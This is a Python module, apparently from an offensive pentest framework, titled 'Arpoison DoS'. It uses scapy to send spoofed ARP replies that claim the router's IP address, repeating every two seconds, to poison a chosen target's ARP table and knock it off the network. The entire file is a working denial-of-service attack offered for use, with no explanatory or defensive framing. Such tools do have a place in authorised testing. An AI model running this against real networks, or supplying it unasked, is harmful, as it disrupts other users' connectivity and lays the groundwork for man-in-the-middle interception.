from base.module import Module
from options import IPAddress, Option
from scapy.all import ARP, send
from lib import network
import time

__module__ = "Arpoison"

class Arpoison(Module):
    def initialize(self):
        self.update_info({
            'name' : 'Arpoison DoS',
            'description' : 'Simple module to perform a denial-of-service ' +
                            'via an ARP table poisoning attack.',
            'license' : 'BSD',
            'author' : ['ganye'],
        })
        self.set_options({
            'router' : IPAddress(True, 'IP address for the network\'s router.',),
            'target' : IPAddress(True, 'IP address for the target.',),
            'interface' : Option(True, 'Current interface to perform the attack ' +
                            'from e.g. eth0',),
        })

    def run(self):
        mac = None
        try:
            mac = network.get_mac(self.interface.value)
        except IOError:
            self.console.error("interface '%s' not found." % self.interface)
            return

        arp = ARP(op=1, psrc=self.router.value, pdst=self.target.value, hwdst=mac)

        self.console.info('sending packets... press Ctrl+C to quit.')
        try:
            while True:
                send(arp, verbose=False)
                self.console.writeln("[+] packet sent")
                time.sleep(2)
        except KeyboardInterrupt:
            self.console.writeln('\rClosing...')
